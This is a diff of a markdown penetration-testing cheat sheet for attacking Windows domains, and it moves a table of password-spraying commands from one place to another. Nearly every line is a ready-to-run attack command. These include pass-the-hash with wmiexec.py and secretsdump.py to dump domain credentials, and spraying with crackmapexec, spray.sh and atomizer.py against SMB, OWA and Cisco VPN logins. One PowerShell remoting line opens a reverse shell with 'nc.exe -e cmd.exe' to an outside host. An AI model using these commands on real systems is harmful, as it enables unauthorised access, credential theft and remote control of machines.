@@ -20,16 +20,6 @@
 | python wmiexec.py -hashes aad3b435b51404eeaad3b435b51404ee:fc525c9683e8fe067095ba2ddc971889 Administrator@192.168.100.10 #with hash |
 | python secretsdump.py -hashes aad3b435b51404eeaad3b435b51404ee:fc525c9683e8fe067095ba2ddc971889  -just-dc acmebank.loca/Administrator@192.168.100.10 |
 
-|  Password Spraying Attack |
-| ------------- |
-| crackmapexec smb 192.168.1.1  -d ninja.corp -u MeME -P /usr/share/wordlists/rockyou.txt|
-| smbclient -N -L \\\\10.10.10.103 | grep Disk | sed 's/^\s*\(.*\)\s*Disk.*/\1/' |
-| crackmapexec smb 192.168.1.1 -u MeMe -H NTHASH |
-|crackmapexec smb 192.168.1.1 -u '' -p '' #NULL Sessions|
-|spray.sh -smb 192.168.1.1 users.txt /usr/share/wordlists/rockyou.txt  1 35 ninja.corp|
-|spray.sh -owa 192.168.1.1 users.txt  /usr/share/wordlists/rockyou.txt   1 35 Request.body #OWA|
-|spray.sh -ciso 192.168.1.1 usernames.txt /usr/share/wordlists/rockyou.txt 1 35 #CISCO Web VPN|
-|./atomizer.py owa contoso.com 'Fall2018' emails.txt|
 
 
 | PowerShell Remoting |
@@ -42,6 +32,16 @@
 |Invoke-Command -ComputerName ninja.corp -Credential $Cred  -ScriptBlock {cmd.exe /c nc.exe -v 192.168.1.100 7777 -e cmd.exe}|
 
 
+|  Password Spraying Attack |
+| ------------- |
+| crackmapexec smb 192.168.1.1  -d ninja.corp -u MeME -P /usr/share/wordlists/rockyou.txt|
+| smbclient -N -L \\\\10.10.10.103 | grep Disk | sed 's/^\s*\(.*\)\s*Disk.*/\1/' |
+| crackmapexec smb 192.168.1.1 -u MeMe -H NTHASH |
+|crackmapexec smb 192.168.1.1 -u '' -p '' #NULL Sessions|
+|spray.sh -smb 192.168.1.1 users.txt /usr/share/wordlists/rockyou.txt  1 35 ninja.corp|
+|spray.sh -owa 192.168.1.1 users.txt  /usr/share/wordlists/rockyou.txt   1 35 Request.body #OWA|
+|spray.sh -ciso 192.168.1.1 usernames.txt /usr/share/wordlists/rockyou.txt 1 35 #CISCO Web VPN|
+|./atomizer.py owa contoso.com 'Fall2018' emails.txt|
 
 
 
